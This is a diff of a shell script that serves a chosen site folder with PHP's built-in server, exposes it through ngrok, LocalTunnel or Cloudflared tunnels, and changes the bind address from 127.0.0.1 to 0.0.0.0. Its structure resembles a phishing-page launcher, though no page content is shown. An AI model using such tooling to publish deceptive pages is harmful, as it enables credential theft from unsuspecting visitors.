@@ -534,7 +534,7 @@ else
             # fi
 
         printf "${Yellow}Starting ${BGreen}PHP ${Green}server "
-        cd webpage/$site && xterm -geometry 90x26+1000 -T "PHP server🅿️" -hold -e "php -S 127.0.0.1:80" > /dev/null 2>&1 & 
+        cd webpage/$site && xterm -geometry 90x26+1000 -T "PHP server🅿️" -hold -e "php -S 0.0.0.0:80" > /dev/null 2>&1 & 
         sleep 5
         printf "${BGreen}OK.${clear}\n"
         printf "${Yellow}Starting ${BGreen}NGROK ${Green}server "
@@ -543,7 +543,7 @@ else
         printf "${BGreen}OK.${clear}\n\n"
         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[-0-9a-z]*\.ngrok.io')
         sleep 3
-        printf "${BYellow}Localhost: ${BGreen}127.0.0.1:80"
+        printf "${BYellow}Localhost: ${BGreen}0.0.0.0:80"
         printf "\n\n"
         printf "${BYellow}Your URL is:${BGreen} %s\e[0m\n" $link
         printf "\n"
@@ -597,7 +597,7 @@ else
             # fi
 
         printf "${Yellow}Starting ${BGreen}PHP ${Green}server "
-        cd webpage/$site && xterm -geometry 90x26+1000 -hold -T "PHP server🅿️" -e "php -S 127.0.0.1:80" > /dev/null 2>&1 &
+        cd webpage/$site && xterm -geometry 90x26+1000 -hold -T "PHP server🅿️" -e "php -S 0.0.0.0:80" > /dev/null 2>&1 &
         sleep 5
         printf "${BGreen}OK.${clear}\n"
         printf "${Yellow}Starting ${BGreen}LocalTunnel ${Green}server "
@@ -606,7 +606,7 @@ else
         printf "${BGreen}OK.${clear}\n\n"
         sleep 3
         # tnnl="(cat xtermtunnel | grep -Eo '(http|https)://[a-zA-Z0-9./?=_%:-]*')"
-        printf "${BYellow}Localhost: ${BGreen}127.0.0.1:80"
+        printf "${BYellow}Localhost: ${BGreen}0.0.0.0:80"
         printf "\n\n"
         printf "${BYellow}Your URL is: ${BGreen} "&& cat xtermtunnel | grep -Eo '(http|https)://[a-zA-Z0-9./?=_%:-]*'
         printf "\n"
@@ -668,17 +668,17 @@ else
             # fi
 
         printf "${Yellow}Starting ${BGreen}PHP ${Green}server "
-        cd webpage/$site && xterm -geometry 90x26+1000 -hold -T "PHP server🅿️" -e "php -S 127.0.0.1:80" > /dev/null 2>&1 &
+        cd webpage/$site && xterm -geometry 90x26+1000 -hold -T "PHP server🅿️" -e "php -S 0.0.0.0:80" > /dev/null 2>&1 &
         sleep 5
         printf "${BGreen}OK.${clear}\n"
         printf "${Yellow}Starting ${BGreen}Cloudflared ${Green}server "
-        xterm -hold -geometry 90x26+1000+1000 -l -lf xtermflared -T "Cloudflared server ☣" -e "cloudflared tunnel --url 127.0.0.1:80" > /dev/null 2>&1 & 
+        xterm -hold -geometry 90x26+1000+1000 -l -lf xtermflared -T "Cloudflared server ☣" -e "cloudflared tunnel --url 0.0.0.0:80" > /dev/null 2>&1 & 
         sleep 5
         printf "${BGreen}OK.${clear}\n\n"
         sleep 3
         # tnnl="(cat xtermflared | grep -Eo '(http|https)://[a-zA-Z0-9./?=_%:-]*')"
         #clink=cat xtermflared | grep -v "api.trycloudflare.com" | grep -Eo '(https)://[a-zA-Z0-9./?=_%:-]*.trycloudflare.com'
-        printf "${BYellow}Localhost: ${BGreen}127.0.0.1:80"
+        printf "${BYellow}Localhost: ${BGreen}0.0.0.0:80"
         printf "\n\n"
         printf "${BYellow}Your URL is:${BGreen} "&& cat xtermflared | grep -v "api.trycloudflare.com" | grep -Eo '(https)://[a-zA-Z0-9./?=_%:-]*.trycloudflare.com'
         printf "\n"
